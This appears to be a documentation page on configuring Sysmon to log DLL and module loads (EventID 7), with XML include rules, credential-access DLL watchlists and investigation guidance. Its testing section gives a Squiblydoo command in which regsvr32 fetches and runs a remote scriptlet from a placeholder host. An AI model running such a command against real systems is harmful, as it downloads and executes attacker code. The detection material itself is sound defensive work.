Image Loading
=============

Sysmon will log **EventID 7** for the loading of images (DLLs, OCX files, and other executable modules) by processes. This is one of the highest-volume event types Sysmon can generate and requires extremely careful configuration. If not properly filtered, image loading can produce millions of events per day and significantly impact system performance.

Understanding the Volume Challenge
-----------------------------------

Every time any process loads a library or module, an image load event is generated. Windows processes routinely load dozens or even hundreds of DLLs during normal operation:
* A web browser loading a single webpage might load 50+ DLLs
* Starting Microsoft Office loads hundreds of DLLs
* Windows services continuously load and unload modules
* Security software, frameworks (.NET, Java), and system utilities all load numerous libraries

This makes image loading fundamentally different from other event types. **You cannot use an exclusion-based approach.** Logging all image loads and filtering out noise is not feasible - the volume is simply too high. Instead, image loading requires a **strictly targeted include approach** where you only monitor for specific suspicious DLLs or specific combinations of processes and libraries.

Detection Value and Use Cases
------------------------------

Despite the volume challenges, image loading provides critical visibility into sophisticated attack techniques:

**DLL Injection and Process Injection**: Attackers inject malicious code into legitimate processes by loading DLLs into the target process's memory space. Image load events can detect:
* Unsigned or suspicious DLLs loaded into sensitive processes
* DLLs loaded from unusual paths (temp directories, user folders)
* Known malicious DLLs identified by hash

**Reflective DLL Loading**: Attackers load DLLs directly into memory without touching disk. While harder to detect, monitoring for the loading of uncommon system DLLs can provide indicators.

**Script Engine Abuse**: Many attacks use Windows scripting engines to execute malicious code. Monitoring for the loading of scripting DLLs helps detect:
* PowerShell engine DLLs loaded by non-PowerShell processes
* VBScript or JScript engine DLLs loaded by Office applications (malicious macros)
* Windows Script Host components loaded by unexpected processes

**COM Object Abuse**: Attackers use COM objects and ActiveX controls for execution. Monitoring specific OCX and COM DLLs can detect techniques like:
* Regsvr32 loading scrobj.dll (Squiblydoo technique)
* MSHTA loading JavaScript engines to bypass AMSI

**Living Off the Land Detection**: Legitimate Windows binaries executing malicious actions often load specific DLLs that indicate suspicious behavior.

**MITRE ATT&CK Mapping**: Image loading events help detect:
* **T1055 - Process Injection**: Injecting DLLs into running processes
* **T1055.001 - DLL Injection**: Classic DLL injection techniques
* **T1129 - Shared Modules**: Loading malicious shared libraries
* **T1059.001 - PowerShell**: Detecting PowerShell execution via System.Management.Automation.dll
* **T1059.005 - Visual Basic**: Detecting VBScript via vbscript.dll
* **T1218.010 - Regsvr32**: Squiblydoo technique via scrobj.dll
* **T1218.005 - Mshta**: MSHTA abuse via jscript9.dll loading

Configuration Philosophy: Targeted Includes Only
-------------------------------------------------

Because of the extreme volume, image loading must be configured with **targeted includes only**. You specify exactly which DLLs to monitor or which process and DLL combinations indicate malicious activity. This approach keeps event volume manageable while maintaining detection capability for high-value indicators.

**Never attempt to:**
* Log all image loads and exclude noise
* Monitor all DLLs loaded by specific processes
* Use broad wildcards or patterns

**Always:**
* Monitor specific suspicious DLLs known to indicate attacks
* Combine process and DLL criteria (e.g., only log PowerShell DLL when loaded by non-PowerShell processes)
* Start with a minimal configuration and expand carefully based on detection gaps

The event fields are:

* **RuleName**: Name of rule that triggered the event.

* **UtcTime**: Time in UTC when event was created

* **ProcessGuid**: Process Guid of the process that loaded the image

* **ProcessId**: Process ID used by the OS to identify the process
    that loaded the image

* **Image**: File path of the process that loaded the image

* **ImageLoaded**: Path of the image loaded

* **FileVersion**: Version of the image loaded

* **Description**: Description of the image loaded

* **Product**: Product name the image loaded belongs to

* **Company**: Company name the image loaded belongs to

* **OriginalFileName**: OriginalFileName from the PE header, added on
    compilation

* **Hashes**: Full hash of the file with the algorithms in the
    HashType field

* **Signed**: State whether the image loaded is signed

* **Signature**: The signer name

* **SignatureStatus**: status of the signature

High-Value DLLs to Monitor
---------------------------

Based on common attack techniques, these DLLs provide the best signal-to-noise ratio:

**Scripting and Execution Engines:**
* **System.Management.Automation.dll** and **System.Management.Automation.ni.dll** - PowerShell engine (detect PowerShell loaded by non-PowerShell processes)
* **vbscript.dll** - VBScript engine (common in malicious macros and scripts)
* **jscript.dll** and **jscript9.dll** - JavaScript engines (used in MSHTA and script-based attacks)
* **scrrun.dll** - Windows Script Runtime (file system and registry access from scripts)
* **wshom.ocx** - Windows Script Host Object Model (used by malicious scripts)

**COM and ActiveX Abuse:**
* **scrobj.dll** - Script Component Runtime (Squiblydoo/Regsvr32 abuse)
* **msxml3.dll** and **msxml6.dll** - XML parsing (used in some script-based attacks)

**Credential Access:**
* **samlib.dll** - Security Accounts Manager library (credential dumping)
* **vaultcli.dll** - Windows Vault access (credential theft)
* **wdigest.dll** - WDigest authentication (credential access)

**Injection and Debugging:**
* **dbghelp.dll** and **dbgcore.dll** - Debugging libraries (process dumping, credential theft)
* **ntdll.dll** loaded from unusual paths - Core system DLL from non-system location (DLL hijacking)

**Suspicious DLL Characteristics to Monitor:**
* Unsigned DLLs loaded into signed processes
* DLLs loaded from user-writable directories (C:\\Users\\*, C:\\ProgramData\\*, C:\\Windows\\Temp\\*)
* DLLs with suspicious names or no metadata
* Known malicious DLL hashes from threat intelligence

Configuration Examples
-----------------------

**Example 1: Script Engine Detection**

```xml
<Sysmon schemaversion="4.22">
    <EventFiltering>
        <RuleGroup name="" groupRelation="or">
            <ImageLoad onmatch="include">
                <!--Detect execution of HTA using the IE Javascript engine to bypass AMSI-->
                <!--Note: Rule placed before Windows Scriptingh to ensure it triggers on this on case any other component is used.-->
                <Rule groupRelation="and">
                    <ImageLoaded name="technique_id=T1170,technique_name=MSHTA with AMSI Bypass" condition="end with">jscript9.dll</ImageLoaded>
                    <Image condition="end with">mshta.exe</Image>
                </Rule>
                <!--Capture components used by malicious macros and scripts.-->
                <Rule groupRelation="or">
                    <ImageLoaded name="technique_id=T1064,technique_name=Windows Scripting Host Component" condition="end with">wshom.ocx</ImageLoaded>
                    <ImageLoaded condition="end with">scrrun.dll</ImageLoaded>
                    <ImageLoaded condition="end with">vbscript.dll</ImageLoaded>
                </Rule>
                <!--Check for loading of the PowerShell engine-->
                <Rule groupRelation="or">
                    <ImageLoaded name="technique_id=T1086,technique_name=PowerShell Engine" condition="end with">System.Management.Automation.ni.dll</ImageLoaded>
                    <ImageLoaded condition="end with">System.Management.Automation.dll</ImageLoaded>
                </Rule>
                <!--Detect the Squiblydoo technique-->
                <Rule groupRelation="or">
                    <ImageLoaded name="technique_id=T1117,technique_name=Regsvr32" condition="end with">scrobj.dll</ImageLoaded>
                </Rule>
            </ImageLoad>
        </RuleGroup>
    </EventFiltering>
</Sysmon>
```

**Example 2: Detecting Unsigned DLLs in Sensitive Processes**

Monitor for unsigned libraries loaded into critical system processes:

```xml
<ImageLoad onmatch="include">
  <Rule name="UnsignedDLLInSystemProcess" groupRelation="and">
    <Image condition="is">C:\Windows\System32\lsass.exe</Image>
    <Signed condition="is">false</Signed>
  </Rule>
  <Rule name="UnsignedDLLInExplorer" groupRelation="and">
    <Image condition="is">C:\Windows\explorer.exe</Image>
    <Signed condition="is">false</Signed>
  </Rule>
</ImageLoad>
```

**Example 3: DLL Loading from Suspicious Paths**

Detect DLLs loaded from user-writable or temporary directories:

```xml
<ImageLoad onmatch="include">
  <Rule name="DLLFromTempDirectory" groupRelation="or">
    <ImageLoaded condition="begin with">C:\Users\</ImageLoaded>
    <ImageLoaded condition="begin with">C:\Windows\Temp\</ImageLoaded>
    <ImageLoaded condition="begin with">C:\ProgramData\</ImageLoaded>
  </Rule>
</ImageLoad>
```

**Example 4: Credential Access DLL Monitoring**

```xml
<ImageLoad onmatch="include">
  <Rule name="CredentialAccessDLLs" groupRelation="or">
    <ImageLoaded condition="end with">samlib.dll</ImageLoaded>
    <ImageLoaded condition="end with">vaultcli.dll</ImageLoaded>
    <ImageLoaded condition="end with">wdigest.dll</ImageLoaded>
  </Rule>
</ImageLoad>
```

What to Investigate
-------------------

When reviewing image load events, prioritize these patterns:

**1. PowerShell Engine Loaded by Non-PowerShell Processes**
* System.Management.Automation.dll loaded by Excel, Word, or other Office applications (malicious macro)
* PowerShell DLL loaded by rundll32.exe, regsvr32.exe, or other LOLBins
* PowerShell loaded by unknown or suspicious processes

**2. Script Engines in Office Applications**
* vbscript.dll, jscript.dll, or wshom.ocx loaded by WINWORD.EXE or EXCEL.EXE (macros or embedded scripts)
* scrrun.dll providing file system access from documents

**3. Squiblydoo and COM Abuse**
* scrobj.dll loaded by regsvr32.exe (classic Squiblydoo)
* Unexpected processes loading COM or ActiveX components

**4. DLL Hijacking Indicators**
* System DLLs (ntdll.dll, kernel32.dll, etc.) loaded from non-system paths
* DLLs with names similar to system DLLs but from user directories

**5. Debugging DLLs Against Critical Processes**
* dbghelp.dll or dbgcore.dll loaded into lsass.exe or other sensitive processes
* Correlation with Process Access events for comprehensive credential dumping detection

**6. Unsigned or Suspicious DLLs**
* Unsigned DLLs loaded into signed processes (potential injection)
* DLLs from temporary directories or download folders
* DLLs with no version information or metadata

Common False Positives and Mitigation
--------------------------------------

Even with targeted includes, some false positives may occur:

**Legitimate PowerShell Usage**: Some enterprise software legitimately uses PowerShell engine DLLs. Document these and create specific exclusions for known-good processes with full path verification.

**Development Environments**: Visual Studio and development tools load many scripting engines and components. Consider excluding developer workstations or specific development tool paths.

**Management Software**: Configuration management tools, monitoring agents, and administrative software may load scripting engines. Whitelist by full path and signature.

**Third-Party Software**: Some commercial applications use embedded scripting. Baseline your environment to identify legitimate uses.

**Mitigation Strategy**:
* Combine multiple criteria (process + DLL + signature status + path)
* Use exclusions sparingly and with full path verification
* Document all exclusions and review quarterly
* Prefer SIEM-level filtering for known-good over Sysmon exclusions

Performance Considerations
---------------------------

Image loading can impact system performance if misconfigured:

**Minimize Monitored DLLs**: Only monitor DLLs with proven detection value. Resist the urge to add every interesting DLL.

**Avoid Wildcards**: Wildcards in ImageLoaded filters can match many DLLs. Be specific.

**Disable on High-Load Systems**: Consider disabling image load monitoring on extremely busy servers (web servers, databases) and focusing on workstations and sensitive servers.

**Test Before Deployment**: Deploy image load configurations to a small test group first and monitor Sysmon CPU usage and event volume.

**Use Signature Checking Wisely**: Checking signatures adds processing overhead. Use signature filters only when necessary.

Testing and Validation
-----------------------

Validate your image loading configuration captures attacks without overwhelming your systems:

1. **Test Script-Based Attacks**: Execute a malicious macro in a lab to verify detection of vbscript.dll loading
2. **PowerShell Detection**: Test PowerShell execution from unusual processes
3. **Squiblydoo Simulation**: Test regsvr32 /u /s /i:http://example.com/payload.sct scrobj.dll technique
4. **Monitor Volume**: Track image load event volume daily to ensure it remains manageable (typically <1000 events/day/host for well-configured systems)
5. **CPU Impact**: Monitor Sysmon CPU usage to ensure image loading is not causing performance issues

Image loading monitoring, when properly configured with targeted includes, provides valuable detection of sophisticated attack techniques like DLL injection, script engine abuse, and process injection. The key is maintaining strict discipline about only monitoring high-value indicators to keep volume and performance impact manageable.
